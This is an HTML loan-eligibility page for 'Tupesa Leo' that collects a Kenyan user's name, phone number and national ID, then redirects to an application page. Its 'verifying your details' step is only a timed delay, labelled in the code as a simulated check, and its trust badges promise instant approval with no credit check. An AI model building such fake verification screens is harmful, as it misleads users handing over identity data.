<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Eligibility | Tupesa Leo</title>
    
    <!-- Favicons -->
    <link rel="apple-touch-icon" sizes="192x192" href="icons/icon.192.png">
    <link rel="icon" type="image/png" sizes="512x512" href="icons/icon.512.png">
    
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- SweetAlert -->
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
    
    <style>
        :root {
            --primary: #4361ee;
            --primary-light: #4895ef;
            --secondary: #3f37c9;
            --white: #ffffff;
            --black: #1a1a1a;
            --gray: #6c757d;
            --light-gray: #f8f9fa;
            --gradient: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            --border-radius: 16px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            min-height: 100vh;
            background-color: var(--light-gray);
            color: var(--black);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            line-height: 1.5;
        }

        .loan-card {
            background: var(--white);
            border-radius: var(--border-radius);
            padding: 28px 24px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 8px 24px rgba(67, 97, 238, 0.1);
            border: 1px solid rgba(67, 97, 238, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo {
            font-weight: 700;
            font-size: 1.8rem;
            color: var(--primary);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .logo span {
            background: var(--gradient);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: var(--gray);
            font-size: 0.95rem;
            margin-bottom: 8px;
        }

        .amount-range {
            font-weight: 600;
            background: var(--gradient);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 1.2rem;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-control {
            width: 100%;
            padding: 16px 18px;
            border: 1px solid rgba(67, 97, 238, 0.2);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: all 0.3s;
            background-color: var(--light-gray);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.1);
        }

        .form-label {
            position: absolute;
            left: 18px;
            top: 16px;
            color: var(--gray);
            font-size: 1rem;
            transition: all 0.3s;
            pointer-events: none;
            background: var(--white);
            padding: 0 6px;
        }

        .form-control:focus + .form-label,
        .form-control:not(:placeholder-shown) + .form-label {
            top: -10px;
            font-size: 0.8rem;
            color: var(--primary);
        }

        select.form-control {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236c757d' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 16px center;
            background-size: 16px;
        }

        .btn-check {
            width: 100%;
            padding: 16px;
            background: var(--gradient);
            color: var(--white);
            border: none;
            border-radius: var(--border-radius);
            font-size: 1.1rem;
            font-weight: 600;
            margin-top: 12px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(67, 97, 238, 0.3);
        }

        .btn-check:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(67, 97, 238, 0.4);
        }

        .btn-check:active {
            transform: translateY(0);
        }

        .trust-note {
            text-align: center;
            font-size: 0.85rem;
            color: var(--gray);
            margin-top: 20px;
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .trust-badge {
            background: var(--white);
            padding: 8px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            display: flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            border: 1px solid rgba(67, 97, 238, 0.1);
        }

        .trust-badge i {
            color: var(--primary);
            font-size: 0.9rem;
        }
    </style>
</head>

<body>
    <div class="loan-card">
        <div class="header">
            <div class="logo">
                
                <span>Tupesa Leo</span>
            </div>
            <h2>Check Your Loan Eligibility</h2>
            <p class="subtitle">Find out how much you qualify for instantly</p>
            <p class="amount-range">Ksh. 1,500 â€“ 10,000</p>
        </div>

        <form id="eligibility_form" onsubmit="handleSubmit(event)">
            <div class="form-group">
                <input type="text" name="name" id="name" class="form-control" placeholder=" " required>
                <label for="name" class="form-label">Full Name</label>
            </div>
            
            <div class="form-group">
                <input type="tel" name="phone_number" id="phone_number" class="form-control" placeholder=" " required>
                <label for="phone_number" class="form-label">Phone Number</label>
            </div>
            
            <div class="form-group">
                <input type="number" name="id_number" id="id_number" class="form-control" placeholder=" " required>
                <label for="id_number" class="form-label">ID Number</label>
            </div>
            
            <div class="form-group">
                <select name="loan_type" id="loan_type" class="form-control" required>
                    <option value="" disabled selected>Select Loan Type</option>
                    <option>Business Loan</option>
                    <option>Personal Loan</option>
                    <option>Education Loan</option>
                    <option>Medical Loan</option>
                    <option>Emergency Loan</option>
                </select>
            </div>

            <div class="trust-badges">
                <div class="trust-badge">
                    <i class="fas fa-lock"></i>
                    <span>Secure Application</span>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-user-shield"></i>
                    <span>No CRB Check</span>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-bolt"></i>
                    <span>Instant Approval</span>
                </div>
            </div>

            <button type="submit" class="btn-check">
                Check Eligibility <i class="fas fa-arrow-right"></i>
            </button>
            
            <p class="trust-note">No paperwork required. No guarantors needed.</p>
        </form>
    </div>

    <!-- SweetAlert JS -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
    
    <script>
        const nameRegex = /^[a-zA-Z\s.'-]{2,}$/;
        const phoneRegex = /^0[7]\d{8}$/;
        const idRegex = /^\d{7,8}$/;

        function handleSubmit(e) {
            e.preventDefault();
            const f = e.target;
            const name = f.name.value.trim();
            const phone = f.phone_number.value.trim();
            const id = f.id_number.value.trim();
            const type = f.loan_type.value;

            if (!nameRegex.test(name)) {
                return Swal.fire('Invalid Name', 'Please enter your full name (letters only)', 'error');
            }
            if (!phoneRegex.test(phone)) {
                return Swal.fire('Invalid Phone', 'Please enter a valid Safaricom number (07XXXXXXXX)', 'error');
            }
            if (!idRegex.test(id)) {
                return Swal.fire('Invalid ID', 'Please enter a valid Kenyan ID (7-8 digits)', 'error');
            }
            if (!type) {
                return Swal.fire('Missing Loan Type', 'Please select your loan purpose', 'error');
            }

            // Store data
            sessionStorage.setItem('myLoan', JSON.stringify({
                name,
                phone_number: phone,
                id_number: id,
                loan_type: type
            }));

            // Show loading
            Swal.fire({
                title: 'Checking Eligibility',
                html: 'We\'re verifying your details...',
                allowOutsideClick: false,
                didOpen: () => Swal.showLoading()
            });
            
            // Simulate API check
            setTimeout(() => {
                Swal.close();
                window.location.href = 'apply.html';
            }, 2500);
        }

        // Fill form if returning
        window.onload = () => {
            const data = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
            if (data.name) {
                document.getElementById('name').value = data.name;
                document.getElementById('name').dispatchEvent(new Event('input'));
            }
            if (data.phone_number) {
                document.getElementById('phone_number').value = data.phone_number;
                document.getElementById('phone_number').dispatchEvent(new Event('input'));
            }
            if (data.id_number) {
                document.getElementById('id_number').value = data.id_number;
                document.getElementById('id_number').dispatchEvent(new Event('input'));
            }
            if (data.loan_type) {
                document.getElementById('loan_type').value = data.loan_type;
            }
        };
    </script>
</body>
</html>
